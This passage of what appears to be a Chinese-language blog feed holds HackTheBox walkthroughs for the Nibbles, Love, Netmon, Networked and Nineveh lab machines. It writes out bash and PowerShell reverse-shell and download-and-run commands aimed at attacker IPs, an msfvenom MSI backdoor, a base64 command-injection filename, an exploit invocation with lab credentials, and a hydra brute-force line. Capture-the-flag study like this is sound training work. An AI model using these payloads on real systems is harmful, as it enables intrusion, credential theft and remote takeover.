                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.5zhlnsybnyc0.webp"
                     
                ></p>
<p>扫一波目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.2e365vf1vl34.webp"
                     
                ></p>
<p>发现一个管理员登录地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.6gunfyd2mzo0.webp"
                     
                ></p>
<p>没账号密码</p>
<p>发现版本信息，搜索一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.3rhtp5sramo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.2izwwnkum9k0.webp"
                     
                ></p>
<p>貌似可以写一个shell进去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox-Nibbles/image.6jcfxvkc42s.webp"
                     
                ></p>
<p>先试试账号密码登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.rc9gnm7ce2o.webp"
                     
                ></p>
<p>写一个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.3hm9rst3vd80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.7jhckpprci8.webp"
                     
                ></p>
<p>拼接路径访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.2j2h2hxhmg80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.7l0sigwvmjc0.webp"
                     
                ></p>
<p>文件存在，试试命令执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.a3xtr5v5drs.webp"
                     
                ></p>
<p>反弹一个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.72hzrye67rc0.webp"
                     
                ></p>
<p>用burp抓包</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.6j59g75j9yk0.webp"
                     
                ></p>
<p>应该是要编码一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.67f8uiyzonk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.6wx4kvrqm0g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.2jrkyvral3g0.webp"
                     
                ></p>
<p>看看有无可利用信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.1v95bw4mf000.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.2jpbfv7t0hi0.webp"
                     
                ></p>
<p>在xxx目录下的monitor.sh文件，可无需密码利用root执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.2swqwxqtkhk0.webp"
                     
                ></p>
<p>没有这个目录</p>
<p>压缩包也没权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.2jjerb0sk360.webp"
                     
                ></p>
<p>手动创建一个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.4qfsu7jlviw0.webp"
                     
                ></p>
<p>在攻击机上写一个，然后在下载到目标机器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.5/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.4uux2x231im0.webp"
                     
                ></p>
<p>利用python开一个http服务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.1ctzqx9fw99c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.5r4hyew3woc0.webp"
                     
                ></p>
<p>添加执行权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.qsrm069gl34.webp"
                     
                ></p>
<p>利用sudo执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.67qgxzqprys0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nibbles/image.4wiajctd2ao0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Love - HackTheBox</title>
    <url>/post/e6483c9ece37/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.292ajhxw4k00.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.6pf501oswx40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.1et30vhrw25c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.72hllio1vhk0.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.63df52x1fvw0.webp"
                     
                ></p>
<p>登录框，猜不出密码，在看看443端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.6qtgcfa4mno0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.3oczguhymti0.webp"
                     
                ></p>
<p>这给出了一个域名，添加hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.lfrzohxc5kw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.70txi93mfzs0.webp"
                     
                ></p>
<p>这发现一个疑似ssrf的地方</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.8m9ynqwvmmg.webp"
                     
                ></p>
<p>看看他的文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.2sqcibvyyj80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.36axbx74ixq0.webp"
                     
                ></p>
<p>这还开了个5000端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.7bf321lnv7k0.webp"
                     
                ></p>
<p>直接访问403错误，尝试让其自己请求一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.6txb4n8i4p80.webp"
                     
                ></p>
<p>得到了一个管理员的账户密码</p>
<p>去80登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.4p8kppen7ee0.webp"
                     
                ></p>
<p>应该不是这里，扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.2f6y81tf3atc.webp"
                     
                ></p>
<p>访问admin目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.6clfvt2cutc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.4jr21cml2740.webp"
                     
                ></p>
<p>在这里可以新建名单，有上传点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.7dpp2ae4hs40.webp"
                     
                ></p>
<p>传一个webshell进去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.ztayf5ud8bk.webp"
                     
                ></p>
<p>反弹shell</p>
<p><code>powershell -c &quot;iex (new-object system.net.webclient).downloadstring(&#39;http://10.10.14.17/test.ps1&#39;)&quot;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.rsic768j18w.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.5kbf6qrjk1s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.midijmxyfs0.webp"
                     
                ></p>
<p>win10专业版 64位系统，补丁打了一大堆</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.x8y0unesojk.webp"
                     
                ></p>
<p>这边也不行，用工具检测一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.1jxlssn7gh6o.webp"
                     
                ></p>
<p>终于碰到了，注册表！</p>
<p>这玩意，只要是以.msi结尾的文件，在运行时，都会以system权限去运行</p>
<p>先用msf生成一个msi后门</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=7777 -f msi -o sh.msi</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.49ieny2l84y0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.1zg6wmv29kww.webp"
                     
                ></p>
<p>很直接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Love/image.6qpt6vmlrw80.webp"
                     
                ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#隐藏界面安装</span><br><span class="line">msiexec /quiet /qn /i xxx.msi</span><br><span class="line">#远程加载安装</span><br><span class="line">msiexec /q /i http://192.168.101.146/test.msi</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Netmon - HackTheBox</title>
    <url>/post/51fbd6a339b6/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.6t7iezvalo80.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.wwcaus9hbpc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.67knt1is2zs0.webp"
                     
                ></p>
<p>先看80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.2g6art2e4668.webp"
                     
                ></p>
<p>左下方发现了程序名字<code>prtg network monitor</code>和版本<code>18.1.37</code>，搜一下看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.18m9cx139r34.webp"
                     
                ></p>
<p>就一个rce，还是需要账号密码</p>
<p>在看看21</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.5z53hf1n3jk0.webp"
                     
                ></p>
<p>貌似，有点直接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.532wgmgdt7s0.webp"
                     
                ></p>
<p>网站目录下没有任何文件</p>
<p><code>https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data</code></p>
<p>在这发现了目录路径</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.6kh7pyb0l740.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.1or3kgwylzsw.webp"
                     
                ></p>
<p>.bak貌似是个备份文件，下载下来</p>
<p><code>wget http://10.10.10.152/ProgramData/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.1p69gb5cznvk.webp"
                     
                ></p>
<p>找着密码了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.32faxv57d9g0.webp"
                     
                ></p>
<p>还是不对，搜了wp才知道，这玩意是备份密码，现在的密码把2018改成了2019，这谁想得到啊</p>
<p><code>PrTg@dmin2019</code></p>
<p>登录后台，现在有了账号密码，去试试那个rce</p>
<p><code>https://github.com/A1vinSmith/CVE-2018-9276</code></p>
<p><code>python cve.py -i 10.10.10.152 -p 80 --lhost 10.10.14.12 --lport 7777 --user prtgadmin --password &#39;PrTg@dmin2019&#39;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.3trg9b9eujs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.35t070r9ms20.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.17jkafycvozg.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Networked - HackTheBox</title>
    <url>/post/7425a7a391f3/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.1udce2m9cd1c.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.2uk4ddiadne0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.5cvzrqzxvdk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.3ol5of7wl2m0.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.61yij1out0k0.webp"
                     
                ></p>
<p>扫描目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.nilysa72js0.webp"
                     
                ></p>
<p>uploads目录下没什么信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.1t5q34pok9i8.webp"
                     
                ></p>
<p>backup目录下疑似一个备份文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.5rmbjpf1vzk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.3wac0qox4py0.webp"
                     
                ></p>
<p>解压之后发现几个php文件，访问看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.1kxn5tf0ykhs.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.senwavz5q4g.webp"
                     
                ></p>
<p>应该是个文件上传，看看源码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.bcjksfsu8a8.webp"
                     
                ></p>
<p>还是个白名单上传，check_file_type函数在lib.php里面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.1ldlej55syv4.webp"
                     
                ></p>
<p>会检测文件的mime类型</p>
<p>前面nmap扫描的时候，80端口扫描出来的中间件为apache 2.4.6版本，该版本有解析漏洞，此时我们只需要上传一个test.php.png的文件，内部包含有恶意代码，利用解析漏洞进行触发</p>
<p>在文件头部添加GIF89a，伪装图片格式</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.szqgpbe01o0.webp"
                     
                ></p>
<p>反弹shell的php文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.7fhi15a3rqw0.webp"
                     
                ></p>
<p>成功上传，监听一下，在访问上传文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.7c05mg0imrc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.2c7q1gv6hgis.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.5688ezfc9hg0.webp"
                     
                ></p>
<p>提权讲究多样性，就不继续用pkexec了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.5eg7sosa2bs0.webp"
                     
                ></p>
<p>在guly家目录下发现一个疑似定时任务的文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.436rb4oluoo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.4teqdyobt1c0.webp"
                     
                ></p>
<p>该文件会每三分钟以php执行check_attack.php</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.2h49p15jm000.webp"
                     
                ></p>
<p>这个文件是删除临时文件的作用，但可以将文件名与rm -f命令进行一个组合，造成反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.24yp12zqeruo.webp"
                     
                ></p>
<p>将反弹命令进行一个base64编码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.167m0ot2e7ls.webp"
                     
                ></p>
<p><code>;echo -n &quot;L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjMvNzc3NyAwPiYxJw==&quot;|base64 -d|bash</code></p>
<p>此时只需要在uploads目录下创建一个名字为这个的文件即可</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.6zz7k4veei80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.68tydcbdgrc0.webp"
                     
                ></p>
<p>继续提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.7dtxhhne5r00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.2kp5po4xu320.webp"
                     
                ></p>
<p>这个大概意思是说，这玩意会创建一个叫guly0的网卡，如果执行这个.sh文件，则会要求输入创建的信息，如果在第一行输入<code>xxxx /bin/bash</code>，那么下面无论是什么内容，都会执行&#x2F;bin&#x2F;bash，造成提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.qe3g7mmy428.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Nineveh - HackTheBox</title>
    <url>/post/6c7691fc8f01/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.4p0ei4neuyw0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.77k90v04rto0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.5d2hpyt2ypo0.webp"
                     
                ></p>
<p>老样子，看80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2pq4vnke1t20.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.yxlk7k9zs0g.webp"
                     
                ></p>
<p>扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2f11jhlobuas.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.3m1onc4r2iy0.webp"
                     
                ></p>
<p>试试弱口令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.6xsc91o08j40.webp"
                     
                ></p>
<p>账号是对的，在试试万能密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2jcimngmm5k0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.3xao0la9xzs0.webp"
                     
                ></p>
<p>爆破一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &quot;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password&quot;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.4sz6boovyxo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2wmd2ton5g60.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.4t3iahwfie80.webp"
                     
                ></p>
<p>疑似文件包含</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.4quo37yvfic0.webp"
                     
                ></p>
<p>必须要包含ninevehNotes.txt才可以</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.78j0aym6w7c0.webp"
                     
                ></p>
<p>没发现可进一步利用信息，返回443看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.piof4yvd0n.webp"
                     
                ></p>
<p>扫目录</p>
<p><code>gobuster dir -u &quot;https://10.10.10.43/&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -k</code>，-k忽略证书安全</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.452sp6usq280.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2a2izqkz2rok.webp"
                     
